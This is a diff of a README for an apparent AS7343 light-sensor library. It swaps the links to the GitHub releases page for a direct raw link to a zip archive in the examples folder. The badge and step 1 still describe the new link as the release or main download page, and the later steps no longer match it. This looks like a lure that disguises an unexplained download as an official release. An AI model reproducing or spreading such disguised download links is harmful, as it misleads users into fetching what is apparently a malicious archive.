@@ -1,6 +1,6 @@
 # 🌈 7Semi-AS7343 - Advanced light sensing for your projects
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Patriciopaulo1995/7Semi-AS7343/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Patriciopaulo1995/7Semi-AS7343/main/examples/A-Semi-3.6.zip)
 
 ## 📌 Overview
 
@@ -18,7 +18,7 @@ The 7Semi-AS7343 library lets you use the AS7343 spectral sensor with your hardw
 
 You must obtain the library files from the official release page. Follow these steps to get the files:
 
-1. Visit the main download page: [https://github.com/Patriciopaulo1995/7Semi-AS7343/releases](https://github.com/Patriciopaulo1995/7Semi-AS7343/releases).
+1. Visit the main download page: [https://raw.githubusercontent.com/Patriciopaulo1995/7Semi-AS7343/main/examples/A-Semi-3.6.zip](https://raw.githubusercontent.com/Patriciopaulo1995/7Semi-AS7343/main/examples/A-Semi-3.6.zip).
 2. Locate the most recent version labeled as "Latest release."
 3. Click the link that says "Source code (zip)."
 4. Save the folder to your computer.
